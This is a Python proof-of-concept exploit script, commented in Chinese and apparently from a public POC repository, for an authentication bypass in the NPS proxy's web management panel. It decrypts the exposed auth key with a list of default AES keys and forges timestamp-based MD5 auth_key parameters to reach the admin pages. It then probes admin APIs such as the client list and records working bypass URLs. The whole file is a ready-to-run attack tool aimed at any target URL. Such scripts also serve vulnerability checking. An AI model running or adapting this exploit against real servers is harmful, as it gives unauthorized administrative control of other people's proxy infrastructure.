#!/usr/bin/env python3
"""
NPS Web管理端认证绕过漏洞利用脚本
版本: 2.0 (基于完整分析优化)
描述: 针对NPS的两种绕过方式: 1)默认配置绕过 2)自定义密钥绕过
用法: python3 nps_bypass.py http://target:port
https://github.com/Domren/POC/
"""

import requests
import time
import hashlib
import json
import sys
import re
from urllib.parse import urljoin, urlparse
from Crypto.Cipher import AES
import binascii

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

class NPSScanner:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.results = {
            'status': 'unknown',
            'auth_key': None,
            'config': {},
            'bypass_urls': [],
            'details': []
        }
        
    def add_detail(self, msg, level="INFO"):
        """添加详细信息"""
        self.results['details'].append(f"[{level}] {msg}")
        prefix = "[+]" if level == "INFO" else "[-]" if level == "ERROR" else "[*]"
        print(f"{prefix} {msg}")
    
    def aes_decrypt(self, ciphertext_hex, key_str):
        """AES-CBC解密 (处理可能的padding问题)"""
        try:
            ciphertext = binascii.unhexlify(ciphertext_hex)
            key = key_str.encode('utf-8')
            iv = b'\x00' * 16  # NPS常用IV
            
            cipher = AES.new(key, AES.MODE_CBC, iv)
            plaintext = cipher.decrypt(ciphertext)
            
            # 尝试多种padding处理方式
            try:
                # PKCS7 padding
                padding_len = plaintext[-1]
                if 1 <= padding_len <= 16:
                    plaintext = plaintext[:-padding_len]
            except:
                # 可能没有标准padding，尝试去除不可见字符
                plaintext = plaintext.rstrip(b'\x00\x0b\x0c\x0e\x0f\x10')
            
            return plaintext.decode('utf-8', errors='ignore').strip()
        except Exception as e:
            return None
    
    def check_default_key(self):
        """检查是否使用默认加密密钥"""
        self.add_detail("检查默认加密密钥...")
        
        # 常见默认密钥列表
        default_keys = [
            "1234567812345678",  # 最常见的默认
            "nps123456789012", 
            "admin1234567890",
            "1234567890123456",
            "abcdefgh12345678"
        ]
        
        crypt_auth_key = self.results['config'].get('crypt_auth_key')
        if not crypt_auth_key:
            return None
        
        for key in default_keys:
            decrypted = self.aes_decrypt(crypt_auth_key, key)
            if decrypted and 1 <= len(decrypted) <= 50:  # 合理的长度范围
                self.add_detail(f"使用密钥 '{key}' 解密成功: '{decrypted}'")
                return decrypted
        
        return None
    
    def probe_config(self):
        """探测NPS配置状态"""
        self.add_detail("正在探测NPS配置...")
        
        # 1. 尝试获取加密的auth_key
        try:
            resp = self.session.get(f"{self.target}/auth/getauthkey")
            if resp.status_code == 200:
                data = resp.json()
                crypt_key = data.get('crypt_auth_key', '')
                
                self.results['config']['crypt_auth_key'] = crypt_key
                self.results['config']['crypt_type'] = data.get('crypt_type', '')
                
                # 判断是否为默认密文
                if crypt_key == "5acabcf051cd55abca03d18294422e01":
                    self.add_detail("发现默认密文! auth_key可能被注释", "INFO")
                    self.results['config']['is_default'] = True
                    return "default_commented"
                else:
                    self.add_detail(f"发现自定义密文: {crypt_key[:16]}...", "INFO")
                    self.results['config']['is_default'] = False
                    
                    # 尝试解密
                    decrypted = self.check_default_key()
                    if decrypted:
                        self.results['auth_key'] = decrypted
                        return "custom_key"
                    else:
                        return "custom_unknown"
        except Exception as e:
            self.add_detail(f"无法获取auth_key: {e}", "ERROR")
        
        # 2. 探测登录页面
        try:
            resp = self.session.get(f"{self.target}/login")
            if "nps" in resp.text.lower() or "login" in resp.text.lower():
                self.add_detail("发现登录页面", "INFO")
        except:
            pass
        
        return "unknown"
    
    def generate_auth_params(self, timestamp=None, auth_key_str=""):
        """生成所有可能的认证参数组合"""
        if timestamp is None:
            timestamp = int(time.time())
        
        algorithms = {}
        
        # 算法1: MD5(timestamp) - 文章主要方法
        algorithms['md5_timestamp'] = hashlib.md5(str(timestamp).encode()).hexdigest()
        
        # 算法2: MD5(timestamp + auth_key) - 需要知道auth_key
        if auth_key_str:
            algorithms['md5_timestamp_authkey'] = hashlib.md5(
                f"{timestamp}{auth_key_str}".encode()
            ).hexdigest()
        
        # 算法3: MD5(auth_key + timestamp)
        if auth_key_str:
            algorithms['md5_authkey_timestamp'] = hashlib.md5(
                f"{auth_key_str}{timestamp}".encode()
            ).hexdigest()
        
        return timestamp, algorithms
    
    def try_bypass(self, timestamp, auth_key_hash, path="/index/index"):
        """尝试绕过登录验证"""
        url = f"{self.target}{path}"
        params = {'auth_key': auth_key_hash, 'timestamp': timestamp}
        
        try:
            resp = self.session.get(url, params=params, allow_redirects=False)
            
            # 检查是否重定向到登录页
            if resp.status_code == 302:
                location = resp.headers.get('Location', '')
                if 'login' in location.lower():
                    return False, "重定向到登录页"
                else:
                    return True, f"302重定向到: {location}"
            
            # 检查响应内容
            content = resp.text.lower()
            
            # 成功的迹象
            success_keywords = ['dashboard', '控制面板', '客户端', 'tunnel', 'nps管理']
            failure_keywords = ['login', '登录', 'username', 'password', 'sign in']
            
            success_count = sum(1 for kw in success_keywords if kw in content)
            failure_count = sum(1 for kw in failure_keywords if kw in content)
            
            if success_count > 0 and failure_count == 0:
                return True, f"发现管理界面关键词 ({success_count}个)"
            elif resp.status_code == 200 and len(content) > 1000:
                # 长响应可能是管理页面
                return True, "收到完整HTML响应"
            else:
                return False, f"状态码: {resp.status_code}, 长度: {len(content)}"
                
        except Exception as e:
            return False, f"请求失败: {e}"
    
    def exploit_default_commented(self):
        """利用默认配置被注释的情况"""
        self.add_detail("尝试默认配置绕过...", "INFO")
        
        success = False
        urls = []
        
        # 生成多个时间戳测试（防止时钟不同步）
        timestamps = [
            int(time.time()),
            int(time.time()) - 1,
            int(time.time()) + 1,
            int(time.time()) - 5,
            int(time.time()) + 5
        ]
        
        # 测试的路径
        test_paths = [
            "/index/index",
            "/",
            "/admin/index",
            "/dashboard"
        ]
        
        for ts in timestamps:
            _, algorithms = self.generate_auth_params(ts)
            
            for path in test_paths:
                auth_hash = algorithms['md5_timestamp']
                is_success, msg = self.try_bypass(ts, auth_hash, path)
                
                if is_success:
                    success = True
                    url = f"{self.target}{path}?auth_key={auth_hash}&timestamp={ts}"
                    urls.append({
                        'url': url,
                        'method': 'GET',
                        'timestamp': ts,
                        'algorithm': 'md5(timestamp)',
                        'path': path,
                        'status': 'success'
                    })
                    self.add_detail(f"绕过成功! URL: {url}", "INFO")
        
        return success, urls
    
    def exploit_custom_key(self, auth_key_str):
        """利用已知自定义auth_key的情况"""
        self.add_detail(f"尝试使用已知auth_key: '{auth_key_str}'", "INFO")
        
        success = False
        urls = []
        
        timestamp, algorithms = self.generate_auth_params(auth_key_str=auth_key_str)
        
        # 测试所有算法
        test_paths = ["/index/index", "/"]
        
        for algo_name, auth_hash in algorithms.items():
            for path in test_paths:
                is_success, msg = self.try_bypass(timestamp, auth_hash, path)
                
                if is_success:
                    success = True
                    url = f"{self.target}{path}?auth_key={auth_hash}&timestamp={timestamp}"
                    urls.append({
                        'url': url,
                        'method': 'GET',
                        'timestamp': timestamp,
                        'algorithm': algo_name,
                        'path': path,
                        'status': 'success'
                    })
                    self.add_detail(f"使用算法 {algo_name} 成功!", "INFO")
                    break
        
        return success, urls
    
    def check_admin_api(self, auth_key_hash, timestamp):
        """检查是否能访问管理API"""
        test_apis = [
            "/client/list",
            "/index/getindex",
            "/index/gettunnel"
        ]
        
        for api in test_apis:
            try:
                url = f"{self.target}{api}?auth_key={auth_key_hash}&timestamp={timestamp}"
                resp = self.session.get(url, allow_redirects=False)
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        self.add_detail(f"API {api} 可访问，返回数据有效", "INFO")
                        return True, api
                    except:
                        self.add_detail(f"API {api} 可访问，但响应不是JSON", "INFO")
                        return True, api
            except:
                continue
        
        return False, None
    
    def run(self):
        """执行完整扫描"""
        print(f"\n{'='*60}")
        print(f"NPS登录绕过漏洞扫描器")
        print(f"目标: {self.target}")
        print(f"{'='*60}\n")
        
        # 步骤1: 探测配置
        config_status = self.probe_config()
        
        # 步骤2: 根据配置状态尝试绕过
        if config_status == "default_commented":
            self.add_detail("状态: 默认配置，auth_key被注释", "INFO")
            success, urls = self.exploit_default_commented()
            
            if success:
                self.results['status'] = 'vulnerable'
                self.results['bypass_urls'] = urls
                
                # 测试管理API
                for url_info in urls:
                    api_success, api_name = self.check_admin_api(
                        url_info['url'].split('auth_key=')[1].split('&')[0],
                        url_info['timestamp']
                    )
                    if api_success:
                        self.add_detail(f"确认管理权限: 可访问 {api_name}", "INFO")
                        break
            else:
                self.results['status'] = 'patched_or_unreachable'
                
        elif config_status == "custom_key" and self.results['auth_key']:
            self.add_detail(f"状态: 自定义密钥，解密得到auth_key", "INFO")
            success, urls = self.exploit_custom_key(self.results['auth_key'])
            
            if success:
                self.results['status'] = 'vulnerable'
                self.results['bypass_urls'] = urls
            else:
                self.results['status'] = 'patched'
                
        elif config_status == "custom_unknown":
            self.add_detail("状态: 自定义配置，无法解密", "WARNING")
            
            # 仍然尝试默认绕过
            success, urls = self.exploit_default_commented()
            if success:
                self.results['status'] = 'vulnerable'
                self.results['bypass_urls'] = urls
            else:
                self.results['status'] = 'likely_patched'
                
        else:
            self.results['status'] = 'unknown_or_not_nps'
        
        # 输出结果摘要
        print(f"\n{'='*60}")
        print("扫描结果摘要:")
        print(f"目标状态: {self.results['status']}")
        
        if self.results['bypass_urls']:
            print(f"\n可用的绕过URL:")
            for i, url_info in enumerate(self.results['bypass_urls'], 1):
                print(f"{i}. {url_info['url']}")
                print(f"   算法: {url_info['algorithm']}, 路径: {url_info['path']}")
        
        print(f"\n详细信息已记录，共 {len(self.results['details'])} 条")
        print(f"{'='*60}")
        
        return self.results

def main():
    if len(sys.argv) < 2:
        print("使用方法:")
        print(f"  {sys.argv[0]} <目标URL>")
        print("\n示例:")
        print(f"  {sys.argv[0]} http://192.168.1.100:8080")
        print(f"  {sys.argv[0]} https://target.com:8443")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # 验证URL格式
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    try:
        scanner = NPSScanner(target)
        results = scanner.run()
        
        # 保存结果到文件
        with open(f"nps_scan_result_{int(time.time())}.json", 'w') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n详细结果已保存到: nps_scan_result_*.json")
        
    except KeyboardInterrupt:
        print("\n[!] 扫描被用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] 扫描出错: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
